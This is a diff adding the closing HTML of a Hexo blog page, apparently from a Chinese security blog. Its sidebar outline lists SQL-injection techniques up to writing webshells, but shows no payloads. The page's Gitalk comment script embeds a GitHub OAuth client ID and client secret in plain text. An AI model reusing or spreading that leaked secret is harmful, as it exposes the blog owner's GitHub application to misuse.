+                SSRF笔记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+   <div id="gitalk-container"></div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%B8%B8%E8%A7%81%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.</span> <span class="nav-text">0x01 常见注入类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%B8%A6%E5%9B%9E%E6%98%BE"><span class="nav-number">1.1.</span> <span class="nav-text">一、带回显</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.1.</span> <span class="nav-text">1. 联合注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.2.</span> <span class="nav-text">2.报错注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="nav-number">1.1.3.</span> <span class="nav-text">二、无回显</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4"><span class="nav-number">1.1.4.</span> <span class="nav-text">1. 基于时间</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%9F%BA%E4%BA%8Ebool"><span class="nav-number">1.1.5.</span> <span class="nav-text">2. 基于bool</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-DNSLOG%E5%B8%A6%E5%A4%96"><span class="nav-number">1.1.6.</span> <span class="nav-text">3. DNSLOG带外</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E5%A6%82%E4%BD%95%E5%8C%BA%E5%88%86%E5%90%8E%E7%AB%AF%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">2.</span> <span class="nav-text">0x02 如何区分后端数据库</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E7%9C%8B%E6%8A%A5%E9%94%99"><span class="nav-number">2.1.</span> <span class="nav-text">1. 看报错</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E9%80%9A%E8%BF%87%E5%90%84%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%B9%E6%9C%89%E7%9A%84%E6%95%B0%E6%8D%AE%E8%A1%A8%E5%92%8C%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%9D%A5%E5%88%A4%E6%96%AD"><span class="nav-number">2.2.</span> <span class="nav-text">2. 通过各个数据库特有的数据表和环境变量来判断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E9%80%9A%E8%BF%87%E5%90%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%B9%E6%9C%89%E7%9A%84%E8%BF%9E%E6%8E%A5%E7%AC%A6%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B"><span class="nav-number">2.3.</span> <span class="nav-text">3. 通过各数据库特有的连接符判断数据库类型</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%B3%A8%E5%85%A5%E4%BD%8D%E7%BD%AE"><span class="nav-number">3.</span> <span class="nav-text">0x03 注入位置</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-limit%E6%B3%A8%E5%85%A5"><span class="nav-number">3.1.</span> <span class="nav-text">1. limit注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-order-by%E6%B3%A8%E5%85%A5"><span class="nav-number">3.2.</span> <span class="nav-text">2. order by注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E8%A1%A8%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="nav-number">3.3.</span> <span class="nav-text">3. 表名注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E7%BB%95%E8%BF%87"><span class="nav-number">4.</span> <span class="nav-text">0x04 绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%9B%BF%E6%8D%A2%E9%80%97%E5%8F%B7"><span class="nav-number">4.1.</span> <span class="nav-text">1. 替换逗号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E7%AC%A6%E5%8F%B7%E6%9B%BF%E6%8D%A2"><span class="nav-number">4.2.</span> <span class="nav-text">2. 符号替换</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-sqlmap-tamper"><span class="nav-number">4.3.</span> <span class="nav-text">3. sqlmap tamper</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-getshell"><span class="nav-number">5.</span> <span class="nav-text">0x05 getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%B3%A8%E5%85%A5%E5%86%99shell"><span class="nav-number">5.1.</span> <span class="nav-text">1. 注入写shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%97%A5%E5%BF%97%E5%86%99shell"><span class="nav-number">5.2.</span> <span class="nav-text">2. 日志写shell</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">欣海余诚</span>
+
+  
+</div>
+
+
+  <!--  <div class="powered-by">
+  由 <a class="theme-link" target="_blank" href="http    s://hexo.io">Hexo</a> 强力驱动
+</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+  <div class="theme-info">
+主题 &mdash;
+  <a class="theme-link" target="_blank" href="https://github.com/iissnan/he    xo-theme-next"></div>
+
+<br/>
+<!-- 不蒜子统计 -->
+    <span id="busuanzi_container_site_pv">
+            本站总访问量<span id="busuanzi_value_site_pv"></span>次
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+            本站访客数<span id="busuanzi_value_site_uv"></span>人
+    </span>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+   <script type="text/javascript">
+        var gitalk = new Gitalk({
+          clientID: '1fff4b96b35fa3febf47',
+          clientSecret: '1ac2f8d73e01cdd9286e7f6d3a78cbd5a1700f33',
+          repo: 'xhycccc.github.io',
+          owner: 'xhycccc',
+          admin: ['xhycccc'],
+          id: location.pathname,
+          distractionFreeMode: 'false'
+        })
+        gitalk.render('gitalk-container')           
+       </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
